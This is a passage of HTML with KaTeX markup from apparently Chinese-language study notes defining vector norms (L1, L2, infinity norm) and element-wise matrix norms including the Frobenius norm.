+\left | x_{m} \right | 
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">∣</span><span class="minner"><span class="mopen delimcenter" style="top:0em;">∣</span><span class="mord mathnormal">x</span><span class="mclose delimcenter" style="top:0em;">∣</span></span><span class="mclose delimcenter" style="top:0em;">∣</span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord"><span class="mord">1</span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.6000100000000002em;vertical-align:-0.55001em;"></span><span class="mop op-symbol large-op" style="position:relative;top:-0.000004999999999977245em;">∑</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">∗</span><span class="mord"><span class="mord"><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord">1</span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7143919999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">∣</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">∣</span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">∣</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">∣</span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="minner">⋯</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">∣</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">∣</span></span></span></span></span></span></p>
<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>L</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">L_{2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">L</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>范数<p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mrow><mo fence="true">∥</mo><mi>x</mi><mo fence="true">∥</mo></mrow><mo>∗</mo><mn>2</mn><mo>=</mo><mroot><mrow><mo fence="true">(</mo><msup><mrow><mo fence="true">∣</mo><msub><mi>x</mi><mn>1</mn></msub><mo fence="true">∣</mo></mrow><mn>2</mn></msup><mo>+</mo><mo>⋯</mo><mo>+</mo><msup><mrow><mo fence="true">∣</mo><msub><mi>x</mi><mi>m</mi></msub><mo fence="true">∣</mo></mrow><mn>2</mn></msup><mo fence="true">)</mo></mrow><mrow></mrow></mroot></mrow><annotation encoding="application/x-tex">\left \| x \right \| *{2} = \sqrt[]{\left ( \left | x_1  \right |^{2}  +\cdots  +\left | x_m \right | ^{2}\right )} 
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">∥</span><span class="mord mathnormal">x</span><span class="mclose delimcenter" style="top:0em;">∥</span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord"><span class="mord">2</span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.44em;vertical-align:-0.8561350000000001em;"></span><span class="mord sqrt"><span class="root"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.43663799999999986em;"><span style="top:-2.436638em;"><span class="pstrut" style="height:2em;"></span><span class="sizing reset-size6 size1 mtight"><span class="mord mtight"></span></span></span></span></span></span></span><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.5838649999999999em;"><span class="svg-align" style="top:-4.4em;"><span class="pstrut" style="height:4.4em;"></span><span class="mord" style="padding-left:1em;"><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size2">(</span></span><span class="minner"><span class="minner"><span class="mopen delimcenter" style="top:0em;">∣</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">∣</span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.954008em;"><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="minner">⋯</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="minner"><span class="minner"><span class="mopen delimcenter" style="top:0em;">∣</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">∣</span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.954008em;"><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size2">)</span></span></span></span></span><span style="top:-3.5438650000000003em;"><span class="pstrut" style="height:4.4em;"></span><span class="hide-tail" style="min-width:1.02em;height:2.48em;"><svg width="400em" height="2.48em" viewBox="0 0 400000 2592" preserveAspectRatio="xMinYMin slice"><path d="M424,2478
c-1.3,-0.7,-38.5,-172,-111.5,-514c-73,-342,-109.8,-513.3,-110.5,-514
c0,-2,-10.7,14.3,-32,49c-4.7,7.3,-9.8,15.7,-15.5,25c-5.7,9.3,-9.8,16,-12.5,20
s-5,7,-5,7c-4,-3.3,-8.3,-7.7,-13,-13s-13,-13,-13,-13s76,-122,76,-122s77,-121,77,-121
s209,968,209,968c0,-2,84.7,-361.7,254,-1079c169.3,-717.3,254.7,-1077.7,256,-1081
l0 -0c4,-6.7,10,-10,18,-10 H400000
v40H1014.6
s-87.3,378.7,-272.6,1166c-185.3,787.3,-279.3,1182.3,-282,1185
c-2,6,-10,9,-24,9
c-8,0,-12,-0.7,-12,-2z M1001 80
h400000v40h-400000z"></path></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.8561350000000001em;"><span></span></span></span></span></span></span></span></span></span></p>
<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>L</mi><mo>∗</mo><mi mathvariant="normal">∞</mi></mrow><annotation encoding="application/x-tex">L*{\infty}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">L</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord"><span class="mord">∞</span></span></span></span></span>范数(无穷大范数)<p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mrow><mo fence="true">∣</mo><mrow><mo fence="true">∣</mo><mi>x</mi><mo fence="true">∣</mo></mrow><mo fence="true">∣</mo></mrow><mo>∗</mo><mi mathvariant="normal">∞</mi><mo>=</mo><mi>m</mi><mi>a</mi><mi>x</mi><mrow><mo fence="true">{</mo><mrow><mo fence="true">∣</mo><mi>x</mi><mo>∗</mo><mn>1</mn><mo fence="true">∣</mo></mrow><mo separator="true">,</mo><mo>⋅</mo><mo>⋅</mo><mo>⋅</mo><mo separator="true">,</mo><mrow><mo fence="true">∣</mo><msub><mi>x</mi><mi>m</mi></msub><mo fence="true">∣</mo></mrow><mo fence="true">}</mo></mrow><mspace linebreak="newline"></mspace></mrow><annotation encoding="application/x-tex">\left| \left| x \right| \right|*{\infty}=max\left\{ \left| x*{1} \right| ,\cdot\cdot\cdot, \left| x_{m} \right| \right\}\\
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">∣</span><span class="minner"><span class="mopen delimcenter" style="top:0em;">∣</span><span class="mord mathnormal">x</span><span class="mclose delimcenter" style="top:0em;">∣</span></span><span class="mclose delimcenter" style="top:0em;">∣</span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord"><span class="mord">∞</span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">a</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">{</span><span class="minner"><span class="mopen delimcenter" style="top:0em;">∣</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord">1</span></span><span class="mclose delimcenter" style="top:0em;">∣</span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">⋅</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord">⋅</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">∣</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">∣</span></span><span class="mclose delimcenter" style="top:0em;">}</span></span></span><span class="mspace newline"></span></span></span></span></p>
</li>
<li>矩阵范数<br>
对向量范数推广可得矩阵范数。<br>
元素形式范数<p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mrow><mo fence="true">∥</mo><mi>x</mi><mo fence="true">∥</mo></mrow><mo>∗</mo><mi>p</mi><mo>=</mo><msup><mrow><mo fence="true">(</mo><mo>∑</mo><mo>∗</mo><msup><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>m</mi></msup><munderover><mo>∑</mo><mrow><mi>j</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></munderover><msup><mrow><mo fence="true">∣</mo><msub><mi>a</mi><mrow><mi>i</mi><mi>j</mi></mrow></msub><mo fence="true">∣</mo></mrow><mi>p</mi></msup><mo fence="true">)</mo></mrow><mfrac><mn>1</mn><mi>p</mi></mfrac></msup></mrow><annotation encoding="application/x-tex">\left \| x \right \| *p=\left ( \sum*{i=1}^{m} \sum_{j=1}^{n}\left | a_{ij} \right |^p   \right )^\frac{1}{p}
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">∥</span><span class="mord mathnormal">x</span><span class="mclose delimcenter" style="top:0em;">∥</span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:3.5076969999999994em;vertical-align:-1.4137769999999998em;"></span><span class="minner"><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size4">(</span></span><span class="mop op-symbol large-op" style="position:relative;top:-0.000004999999999977245em;">∑</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">∗</span><span class="mord"><span class="mord"><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord">1</span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7143919999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6513970000000007em;"><span style="top:-1.872331em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.050005em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3000050000000005em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.4137769999999998em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner"><span class="minner"><span class="mopen delimcenter" style="top:0em;">∣</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">∣</span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.804292em;"><span style="top:-3.2029000000000005em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">p</span></span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size4">)</span></span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:2.09392em;"><span style="top:-4.5029em;margin-right:0.05em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen nulldelimiter sizing reset-size3 size6"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8443142857142858em;"><span style="top:-2.656em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span></span></span></span><span style="top:-3.2255000000000003em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line mtight" style="border-bottom-width:0.049em;"></span></span><span style="top:-3.384em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.48288571428571425em;"><span></span></span></span></span></span><span class="mclose nulldelimiter sizing reset-size3 size6"></span></span></span></span></span></span></span></span></span></span></span></span></span></p>
<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>L</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">L_{1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">L</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>范数(<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">p=1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>)<p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mrow><mo fence="true">∥</mo><mi>A</mi><mo fence="true">∥</mo></mrow><mo>∗</mo><mn>1</mn><mo>=</mo><mo>∑</mo><mo>∗</mo><msup><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>m</mi></msup><munderover><mo>∑</mo><mrow><mi>j</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></munderover><mrow><mo fence="true">∣</mo><msub><mi>a</mi><mrow><mi>i</mi><mi>j</mi></mrow></msub><mo fence="true">∣</mo></mrow></mrow><annotation encoding="application/x-tex">\left \| A \right \| *{1}=\sum*{i=1}^{m} \sum_{j=1}^{n}\left | a_{ij} \right |
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">∥</span><span class="mord mathnormal">A</span><span class="mclose delimcenter" style="top:0em;">∥</span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord"><span class="mord">1</span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:3.0651740000000007em;vertical-align:-1.4137769999999998em;"></span><span class="mop op-symbol large-op" style="position:relative;top:-0.000004999999999977245em;">∑</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">∗</span><span class="mord"><span class="mord"><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord">1</span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7143919999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6513970000000007em;"><span style="top:-1.872331em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.050005em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3000050000000005em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.4137769999999998em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">∣</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">∣</span></span></span></span></span></span></p>
<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>L</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">L_{2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">L</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>范数(<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi><mo>=</mo><mn>2</mn></mrow><annotation encoding="application/x-tex">p=2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span></span></span></span>)<p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mrow><mo fence="true">∥</mo><mi>A</mi><mo fence="true">∥</mo></mrow><mo>∗</mo><mi>F</mi><mo>=</mo><mo stretchy="false">(</mo><mo>∑</mo><mo>∗</mo><msup><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>m</mi></msup><munderover><mo>∑</mo><mrow><mi>j</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></munderover><msup><mrow><mo fence="true">∣</mo><msub><mi>a</mi><mrow><mi>i</mi><mi>j</mi></mrow></msub><mo fence="true">∣</mo></mrow><mn>2</mn></msup><msup><mo stretchy="false">)</mo><mfrac><mn>1</mn><mn>2</mn></mfrac></msup></mrow><annotation encoding="application/x-tex">\left \| A \right \| *{F}=(\sum*{i=1}^{m} \sum_{j=1}^{n}\left | a_{ij} \right |^2)^\frac{1}{2} 
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">∥</span><span class="mord mathnormal">A</span><span class="mclose delimcenter" style="top:0em;">∥</span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">F</span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:3.0651740000000007em;vertical-align:-1.4137769999999998em;"></span><span class="mopen">(</span><span class="mop op-symbol large-op" style="position:relative;top:-0.000004999999999977245em;">∑</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">∗</span><span class="mord"><span class="mord"><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord">1</span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7143919999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span 